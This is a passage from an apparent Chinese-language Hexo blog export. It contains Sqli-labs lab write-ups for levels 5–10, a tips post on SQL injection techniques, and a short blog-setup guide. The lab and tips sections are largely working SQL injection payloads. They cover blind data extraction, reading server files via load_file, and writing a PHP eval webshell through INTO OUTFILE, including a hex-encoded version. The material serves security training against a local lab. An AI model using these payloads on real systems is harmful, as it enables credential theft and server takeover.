1,1),0x7e)) --+ //爆表名称，同样改变limit的变量去看每个表 （3）延时注入 http://127.0.0.1/AAsqli-labs/Less-5/?id=1&#39; and if((substr(database(),1,1)&gt;&#39;a&#39;),1,sleep(5)) --+ //马上返回内容 http://127.0.0.1/AAsqli-labs/Less-5/?id=1&#39; and if((substr(database(),1,1)&gt;&#39;s&#39;),1,sleep(5)) --+ //等待了5秒后，返回空白 http://127.0.0.1/AAsqli-labs/Less-5/?id=1&#39; and if((substr(database(),1,8)=&#39;security&#39;),1,sleep(5)) --+ //马上返回内容 Less - 6第6关与第5关不同就是对参数ID的处理不同了，变成一个双引号 http://127.0.0.1/AAsqli-labs/Less-6/?id=1&quot; 我们使用xpath报错注入试一下 http://127.0.0.1/AAsqli-labs/Less-6/?id=1&quot; and extractvalue(1,concat(0x3a,(select username from users where id=2),0x3a)) --+ http://127.0.0.1/AAsqli-labs/Less-6/?id=1&quot; and extractvalue(1,concat(0x3a,(select password from users where id=2),0x3a)) --+ 其他的内容和第5关一样，只是单引号改成双引号，这里就不再赘述了 Less - 7这关接触到了dump into outfile。关于这部分知识点可以看这篇博客的Tip 3部分：Sqli-labs Tips 查看 index.php 文件内对于参数ID的处理 $sql=&quot;SELECT * FROM users WHERE id=((&#39;$id&#39;)) LIMIT 0,1&quot;; 可以看出来这里对ID的处理是((‘id’))，那么我们就可以使用1’)) or 1=1 –+进行注入 http://127.0.0.1/AAsqli-labs/Less-7/?id=1&#39;)) or 1=1--+ 那么我们现在就可以通过文件导入的方式写入文件 http://127.0.0.1/AAsqli-labs/Less-7/?id=-1&#39;)) union select 1,2,3 into outfile &quot;C:\\\\phpstudy\\\\WWW\\\\AAsqli-labs\\\\Less-7\\\\HSW.php&quot; --+ 可以看到虽然提示语法错误，但是我们这个HSW.php文件是已经写入的了 可以访问一下 既然是可以成功写入的，那么我们就可以把写入的内容换成一句话木马 http://127.0.0.1/AAsqli-labs/Less-7/?id=-1&#39;)) union select 1,2,&#39;&lt;?php @eval($_post[&quot;HSW&quot;])?&gt;&#39; into outfile &quot;C:\\\\phpstudy\\\\WWW\\\\AAsqli-labs\\\\Less-7\\\\HSW2.php&quot; --+ 注意： 这里要写入的文件必须是之前没有的，如果我这里还是使用HSW.php，那么一句话木马是不会写入的。只有改成不存在的文件名，如HSW2.php才行 我们这里用一句话代替之前3的位置，要加上2个单引号把语句括起来 我们也是可以访问一下这个HSW2.php文件，看有没有导入成功。结果看来是有的 这是就可以用蚁剑或者菜刀等等工具去连接 Less - 8构造URL，传入id参数，赋值为1’，进行尝试 http://127.0.0.1/AAsqli-labs/Less-8/?id=1&#39; 此时我们发现和之前不同的是，没有报错信息了！怎么办？根据之前的经验，我们配合or 1=1 –+ 进行尝试 http://127.0.0.1/AAsqli-labs/Less-8/?id=1&#39; or 1=1 --+ 嗯？返回正常结果了，那我们就可以猜，原文件对ID的处理只是简单的单引号 查看 index.php 文件，和我们猜想的一样 $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;; 那么这关也是使用盲注，但是却只能用布尔注入和延时注入 这关报错注入无法使用 布尔注入 正确：http://127.0.0.1/AAsqli-labs/Less-8/?id=1&#39; and substr(database(),1,1)&gt;&#39;a&#39; --+ 错误：http://127.0.0.1/AAsqli-labs/Less-8/?id=1&#39; and substr(database(),1,1)&gt;&#39;s&#39; --+ 延时注入 立即返回：http://127.0.0.1/AAsqli-labs/Less-8/?id=1&#39; and if((substr(database(),1,1)&gt;&#39;a&#39;),1,sleep(5)) --+ 等待5秒：http://127.0.0.1/AAsqli-labs/Less-8/?id=1&#39; and if((substr(database(),1,1)&gt;&#39;s&#39;),1,sleep(5)) --+ 报错注入（无法使用） http://127.0.0.1/AAsqli-labs/Less-8/?id=1&#39; and extractvalue(1,concat(0x3a,(select database()),0x3a)) --+ Less - 9题目的标题是Blind- Time based- Single Quotes，翻译就是盲注—基于时间—单引号 那么我们就根据提示去做题了 从源代码我们可以看出，不管你做什么，它都只返回You are in …….. 爆数据库名 立即返回：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&#39; and if((substr(database(),1,1)&gt;&#39;a&#39;),1,sleep(5)) --+ 等待5秒：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&#39; and if((substr(database(),1,1)&gt;&#39;s&#39;),1,sleep(5)) --+ 从上面这2张图我们也可以看出，不管输入什么都只返回You are in ……..，所以只能根据响应时间来判断 …… 不断尝试之后，我们知道数据库名是security 爆security数据库下的表名 第一个表：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&#39; and if((substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1)&gt;&#39;e&#39;),1,sleep(5)) --+ 第二个表：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&#39; and if((substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 1,1),1,1)&gt;&#39;r&#39;),1,sleep(5)) --+ 第三个表：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&#39; and if((substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 2,1),1,1)&gt;&#39;u&#39;),1,sleep(5)) --+ 第四个表：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&#39; and if((substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 2,1),1,1)&gt;&#39;u&#39;),1,sleep(5)) --+ 慢慢地爆出security下的表名：emails，referers，uagents，users 爆users表下的列名 第一列：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&#39; and if((substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1)&gt;&#39;i&#39;),1,sleep(5)) --+ 第二列：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&#39; and if((substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),1,1)&gt;&#39;u&#39;),1,sleep(5)) --+ 第三列：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&#39; and if((substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 2,1),1,1)&gt;&#39;p&#39;),1,sleep(5)) --+ 慢慢地爆出users下的列名：id，username，password 爆users表下的username列的数据 第一行：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&#39; and if((substr((select username from users limit 0,1),1,1)&gt;&#39;d&#39;),1,sleep(5)) --+ 爆出第一行的数据是dumb Less - 10题目的标题是Blind- Time based- Double Quotes，翻译就是盲注—基于时间—双引号 那么这关和第9关的差别就只是单引号和双引号的问题了 就不再赘述了，可以自己去尝试 http://127.0.0.1/AAsqli-labs/Less-10/?id=1&quot; and if((substr(database(),1,1)&gt;&#39;a&#39;),1,sleep(5)) --+ 至此，1-10关的Write-up结束 后一部分链接：第11-20关Write-up","categories":[],"tags":[{"name":"Sqli-labs","slug":"Sqli-labs","permalink":"https://knlvre.github.io/tags/Sqli-labs/"}],"author":"Knlvre"},{"title":"Sqli-labs Tips","slug":"Sqli-labs Tips","date":"2019-01-27T16:00:00.000Z","updated":"2019-08-01T09:11:27.095Z","comments":true,"path":"2019/01/28/Sqli-labs Tips/","link":"","permalink":"https://knlvre.github.io/2019/01/28/Sqli-labs Tips/","excerpt":"","text":"Tip 1 —— 基础知识点（1）简单的用于尝试的语句 or 1=1--+ &#39;or 1=1--+ &quot;or 1=1--+ )or 1=1--+ &#39;)or 1=1--+ &quot;) or 1=1--+ &quot;))or 1=1--+ ps:--+和#可以互相替换 （2）mysql命令行的简单命令 查看所有的数据库 show databases; 使用某个数据库(比如security数据库) use security; 查看我们使用的数据库中有哪些表 show tables; 看一下我们想要查看的表的内容(比如users表) desc users; （3）利用 information_schema 数据库进行注入的命令 猜数据库 select schema_name from information_schema.schemata 猜某库的所有表(比如security数据库) select table_name from information_schema.tables where table_schema=&#39;security&#39; 猜某表的所有列(比如user表) select column_name from information_schema.columns where table_name=&#39;user&#39; （4） order by 命令 用于显示某个表时，对表中某列进行排序，可以用来猜表有多少列 比如：security-uers表中有3列，可以order by 1 ;order by 2;order by 3;分别是对第1，2，3列排序 比如：security-email表中有2列，可以order by 1 ;order by 2;分别是对第1，2列排序 ps：如果某一个表只有X列，当order by x+1时，就会开始出错，这一点可以用来猜表有多少列 具体例子可以看less-1中的讲解 （5） union 命令 union的作用是将两个sql语句进行联合 union前后的两个sql语句的选择列数要相同才可以 具体理解看less-1里的例子 （6）几个常用函数 MySQL版本：version() 数据库用户名：user() 数据库名：database() 数据库路径：@@datadir 操作系统版本：@@version_compile_os （7）Limit的用法 limit 0，1 //表示从第1行开始，显示1行 limit 1，3 //表示从第2行开始，显示3行 可以参考以下图片看详细用法： Tip 2 —— 盲注知识点什么是盲注？盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。盲注的类型分为以下三种： 基于布尔SQL盲注 基于时间的SQL盲注 基于报错的SQL盲注 关于这方面知识的文章很多，我们这里就只做简单介绍 （1）基于布尔SQL盲注 常用的函数：left()，substr()，mid()，ascii()，ord() left(string,length) //left()函数用于截取字符串string的前length个字符 substr(string,start,length) //substr()函数用于截取字符串string，从start位置开始，截取length长度 mid(string,start,length) //mid()函数功能和substr()函数一样 ascii(string) //ascii()函数用于将字符串string转换成ASCII码 ord() //ord()函数功能和ascii()函数一样 举几个栗子： left(database(),3) //database()用于显示数据库名称，3表示截取前3位，如database名称为&quot;security&quot;，那么结果就是&quot;sec&quot; left(database(),1) &gt; &#39;w&#39; //这个语句结果是否定的，因为&quot;security&quot;截取前1个字符是&quot;s&quot;，在26个字母顺序中&quot;s&quot;是在&quot;w&quot;前面的, 所以是小于。如果将表达式的&quot;w&quot;换成&quot;a&quot;，则结果是肯定的 substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1) //首先string部分的结果是&quot;email&quot;，那么这整个语句的结果是&quot;a&quot;。关于limit的用法，可以在Tip 1上面看到 另外，关于正则表达式可以参考这篇文章：盲注之正则表达式 （2）基于报错的SQL盲注 什么是报错盲注：构造payload让信息通过错误提示回显出来 这里我们简单了解一下 extractvalue()和concat() 函数的用法就行 extractvalue(1,concat(0x7e,(select database()),0x7e)) //这个函数执行后会将数据库的名称通过报错方式显示出来 （3）基于时间的SQL盲注 什么是时间盲注：原理于布尔盲注差不多，只不过添加控制时间的函数：当结果正确（错误）时，让页面停留n秒后再返回结果 常用函数：if()，sleep() if(expr1,expr2,expr3) //如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。 sleep(n) //睡眠n秒 举个栗子： if(substr(database(),1,1))=&#39;s&#39;,0,sleep(5)) //如果数据库的名称的第一个字符是&#39;s&#39;，就直接返回结果，不然就延时5秒再返回结果 Tip 3 —— 导入导出文件知识点1、load_file()导出文件 Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。 使用条件： 必须有权限读取并且文件必须完全可读 ​ and (select count() from mysql.user)&gt;0/ 如果结果返回正常,说明具有读写权限。 ​ and (select count() from mysql.user)&gt;0/ 返回错误，应该是管理员给数据库帐户降权 欲读取文件必须在服务器上 必须指定文件完整的路径 欲读取文件必须小于 max_allowed_packet 如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限，在windows下，如果NTFS设置得当，是不能读取相关的文件的，当遇到只有administrators才能访问的文件，users就别想load_file出来。 在实际的注入中，我们有两个难点需要解决： 绝对物理路径 构造有效的畸形语句 （报错爆出绝对路径） 在很多PHP程序中，当提交一个错误的Query，如果display_errors = on，程序就会暴露WEB目录的绝对路径，只要知道路径，那么对于一个可以注入的PHP程序来说，整个服务器的安全将受到严重的威胁。 常用路径：http://www.cnblogs.com/lcamry/p/5729087.html 示例： Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109))) 利用hex()将文件内容导出来，尤其是smb文件时可以使用。 -1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105)) Explain：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的ASCII代码 -1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69) Explain：“c:/boot.ini”的16进制是“0x633a2f626f6f742e696e69” -1 union select 1,1,1,load_file(c:\\\\boot.ini) Explain:路径里的/用 \\\\代替 2、文件导入到数据库 LOAD DATA INFILE语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。 在注入过程中，我们往往需要一些特殊的文件，比如配置文件，密码文件等。当你具有数据库的权限时，可以将系统文件利用load data infile导入到数据库中。 函数具体介绍：对于参数介绍这里就不过多的赘述了，可以参考mysql的文档。（提醒：参考文档才是最佳的学习资料） 示例： load data infile &#39;/tmp/t0.txt&#39; ignore into table t0 character set gbk fields terminated by &#39;\\t&#39; lines terminated by &#39;\\n&#39; 3、导入到文件 SELECT.....INTO OUTFILE &#39;file_name&#39; 可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有FILE权限，才能使用此语法。file_name不能是一个已经存在的文件。 我们一般有两种利用形式： 第一种直接将select内容导入到文件中： Select version() into outfile “c:\\\\phpnow\\\\htdocs\\\\test.php” 此处将version()替换成一句话，&lt;?php @eval($_post[“mima”])?&gt;也即 Select &lt;?php @eval($_post[“mima”])?&gt; into outfile “c:\\\\phpnow\\\\htdocs\\\\test.php” 直接连接一句话就可以了，其实在select内容中不仅仅是可以上传一句话的，也可以上传很多的内容。 第二种修改文件结尾： Select version() Into outfile “c:\\\\phpnow\\\\htdocs\\\\test.php” LINES TERMINATED BY 0x16进制文件 解释：通常是用\\r\\n结尾，此处我们修改为自己想要的任何文件。同时可以用FIELDS TERMINATED BY 16进制可以为一句话或者其他任何的代码，可自行构造。在sqlmap中os-shell采取的就是这样的方式，具体可参考os-shell分析文章：http://www.cnblogs.com/lcamry/p/5505110.html 注意： （1）可能在文件路径当中要注意转义，这个要看具体的环境 （2）上述我们提到了load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语句： select load_file(‘c:\\\\wamp\\\\bin\\\\mysql\\\\mysql5.6.17\\\\my.ini’)into outfile ‘c:\\\\wamp\\\\www\\\\test.php’ 可以利用该语句将服务器当中的内容导入到web服务器下的目录，这样就可以得到数据了。上述my.ini当中存在password项（不过默认被注释），当然会有很多的内容可以被导出来，这个要平时积累。 Tip 4 —— 宽字节注入知识点宽字节注入重点针对’和\\的过滤，所以我们放在一起来进行讨论。 对宽字节注入的同学应该对这几关的bypass方式应该比较了解。我们在此介绍一下宽字节注入的原理和基本用法。 原理：mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如%aa%5c就是一个汉字（前一个ascii码大于128才到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思路是将 ‘ 转换为\\’（转换的函数或者思路会在每一关遇到的时候介绍）。因此我们在此想办法将 ‘ 前面添加的 \\ 除掉，一般有两种思路： ①%df吃掉 \\ 具体的原因是urlencode(‘) = %5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此事%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。 ②将 \\’ 中的 \\ 过滤掉，例如可以构造 %**%5c%5c%27的情况，后面的%5c会被前面的%5c给注释掉。这也是bypass的一种方法。 Tip 5 —— 堆叠注入知识点Stacked injections：堆叠注入。从名词的含义就可以看到应该是一堆sql语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行中，每一条语句结尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用 在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句 mysql_query()函数只能执行一个sql语句，而mysqli_multi_query()函数可以执行多个sql语句 mysql_query() 和 mysqli_multi_query() 例如以下这个例子。用户输入 1; DELETE FROM products 服务器端生成的sql语句为：（因未对输入的参数进行过滤） Select * from products where productid=1;DELETE FROM products 当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 Tip 6 —— order by注入知识点这里将结合Less46的截图来讲解原理 order by注入传入的参数是sort，一般有以下几种方式进行注入 ①直接添加注入语句 ?sort=(select **) ②rand()：利用两种结果来进行盲注 ?sort=rand(sql语句) Ps：rand(ture)和rand(false)的结果是不一样的 ③and：后面添加sql语句 ?sort=1 and (sql语句) ④报错注入 双查询报错注入 select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) procedure analyse()：前面不用跟and ?sort=1 procedure analyse(extractvalue(1,concat(0x3a,database())),1) extractvalue()：前面要跟and ?sort=1 and extractvalue(1,concat(0x3a,database(),0x3a)) updatexml()：比extractvalue()多了一个,1 ?sort=1 updatexml(1,concat(0x3a,database(),0x3a),1) ⑤into outfile：写马 ?sort=1 into outfile &quot;C:/phpStudy/WWW/shell.php&quot; lines terminated by 0x3c3f70687020406576616c28245f504f53545b5f5d293b203f3e","categories":[],"tags":[{"name":"Sqli-labs","slug":"Sqli-labs","permalink":"https://knlvre.github.io/tags/Sqli-labs/"}],"author":"Knlvre"},{"title":"hexo + github搭建博客","slug":"hexo+github搭建博客","date":"2019-01-27T12:00:00.000Z","updated":"2019-11-27T11:44:03.710Z","comments":true,"path":"2019/01/27/hexo+github搭建博客/","link":"","permalink":"https://knlvre.github.io/2019/01/27/hexo+github搭建博客/","excerpt":"","text":"Tip 1前面大致的步骤参考这篇文章：https://mochazz.github.io/2017/07/26/hexo-build/ Tip 2仓库的名字用your_name.github.io就可以 Tip 3去这个网站下载主题：https://hexo.io/themes/ 挑选好喜欢的博客后，点击链接到他们Github的页面，下载下来 直接解压到 themes 这个文件夹下 然后在 _config.yml 这个配置文件中 Extensions 模块的 theme 改成刚才那个文件的名字，模板就运用成功了，然后就可以根据自己的喜好修改一些东西 Tip 4主题设置完之后，本地测试通过（hexo clean + hexo s + 访问127.0.0.1:4000），经过个人喜好修改的博客可以正常显示，但是上传到Github上就不行（hexo clean + hexo g &amp;&amp; hexo d）。后来发现是 _config.yml 中有些参数没设置好： 在仓库界面中点击 Setting 找到 Repository name 写到 _config.yml 文件中的 url root参数如图所示写就行了 现在再次访问博客，就可以正常显示了 安装问题Windwos node 的升级 到官网： https://nodejs.org/en/download/ 下载新版的msi文件，双击安装，安装过程中选择的路径为原本的路径，比如我的：G:\\Security\\Blogs\\Node.js 安装完成就升级成功了，可以用node -v查看版本 hexo 创建新页面 比如创建一个whoami页面，使用命令：hexo new page whoami","categories":[],"tags":[{"name":"博客搭建","slug":"博客搭建","permalink":"https://knlvre.github.io/tags/博客搭建/"}],"author":"Knlvre"}]}